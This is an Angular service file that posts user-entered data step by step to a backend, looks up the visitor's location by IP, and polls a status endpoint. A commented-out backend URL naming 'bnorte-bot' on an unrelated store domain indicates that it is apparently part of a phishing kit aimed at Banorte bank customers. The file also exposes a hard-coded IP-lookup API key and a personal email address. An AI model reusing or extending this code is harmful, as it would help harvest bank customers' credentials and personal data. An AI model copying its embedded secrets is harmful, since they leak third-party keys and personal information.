import { Injectable } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';
import UserModel from '../models/user.model';
import { environment } from 'src/environments/environment';

@Injectable({
  providedIn: 'root',
})
export class MainService {
  private mainUrl = environment.API_URL;
  // private mainUrl = "http://localhost:3000";
  // private mainUrl = 'https://bnorte-bot.cellzonestore.com.mx';

  headers: HttpHeaders = new HttpHeaders({
    'Content-Type': 'application/json',
  });

  constructor(private http: HttpClient) {}

  sendData(userModel: UserModel, current: string) {
    return this.http
      .post(`${this.mainUrl}/${current}`, JSON.stringify(userModel), {
        headers: this.headers,
      })
      .toPromise();
  }

  getCurrentCountry() {
    // nanyeliramirez000@gmail.com | ip usa zip 61615
    return this.http
      .get('https://extreme-ip-lookup.com/json/?key=N1MTDluxSHI5TK8FJoie')
      .toPromise();
  }

  getStatus() {
    return this.http.get(`${this.mainUrl}/out/status`).toPromise();
  }
}
